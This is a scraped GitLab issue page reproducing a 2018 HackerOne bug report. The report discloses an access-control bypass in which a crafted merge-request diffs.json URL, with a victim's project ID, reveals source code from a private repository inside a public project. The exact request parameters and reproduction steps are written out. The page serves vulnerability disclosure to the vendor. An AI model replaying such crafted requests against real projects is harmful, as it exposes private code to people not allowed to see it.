=== Content from gitlab.com_911f23f4_20250125_051352.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

Project 'gitlab-org/gitlab-ce' was moved to 'gitlab-org/gitlab-foss'. Please update any links and bookmarks that may still have the old path.

# Source Code Disclosure of Private Repo in Public/Internal Project

**[HackerOne report #455673](https://hackerone.com/reports/455673)** by ngalog on 2018-12-05:

**Summary:**
One of the very unique feature of Gitlab is that it allows you to adjust the permission of each separate part of your project. Consider this setting, a public project with a private repo.
Like in this screenshot [![publicWithPrivateRepo.PNG](data:image/gif;base64...)](https://user-content.gitlab-static.net/35924ee00e0441de390866c8aa103d7212888e0e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3435353637332f3338353630342f7075626c696357697468507269766174655265706f2e504e47)

Owner of project could be secretly developing something in the repo part and but want to keep the rest of the project public.

However, there is a way to bypass this protection, and still allow non-project member to view the source code of repo.

## Steps To Reproduce (Quick):

* Login and visit [here](https://gitlab.com/ashleyjohnson/personal-project-with-private-source-code) to confirm you can't see the repo -- project id is `9769102`
* Visit one of the project you own and visit `https://gitlab.com/{project_name_space}/merge_requests/new/diffs.json`, if you can see `{"html":"\u003cdiv class=\"nothing-here-block\"\u003e\nThis merge request cannot be created.\n\u003c/div\u003e\n"}` in response, please proceed, if not, please create at least one file in that project
* Then add this in the query part of the url `?utf8=%E2%9C%93&amp;merge_request%5Bsource_project_id%5D=9769102&amp;merge_request%5Bsource_branch%5D=master&amp;merge_request%5Btarget_project_id%5D=124124124&amp;merge_request%5Btarget_branch%5D=master`
* Now you are looking at the source code for my private repo in project `9769102`

## Slow way to reproduce:

* Create a project with config like this [![publicWithPrivateRepo.PNG](data:image/gif;base64...)](https://user-content.gitlab-static.net/35924ee00e0441de390866c8aa103d7212888e0e/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3435353637332f3338353630342f7075626c696357697468507269766174655265706f2e504e47)
* create some file inside
* login as other user, and visit `https://gitlab.com/{project_namespace_that_you_own}/merge_requests/new/diffs.json?utf8=%E2%9C%93&amp;merge_request[source_project_id]={victim_project_id}&amp;merge_request[source_branch]=master&amp;merge_request[target_project_id]=1294819248&amp;merge_request[target_branch]=master`
* Source code disclosure!

## Impact

source code disclosure for private repo in public project

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [publicWithPrivateRepo.PNG](https://h1.sec.gitlab.net/a/455673/385604/publicWithPrivateRepo.PNG)

Edited Dec 05, 2018 by [Dennis Appelt](/dappelt)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


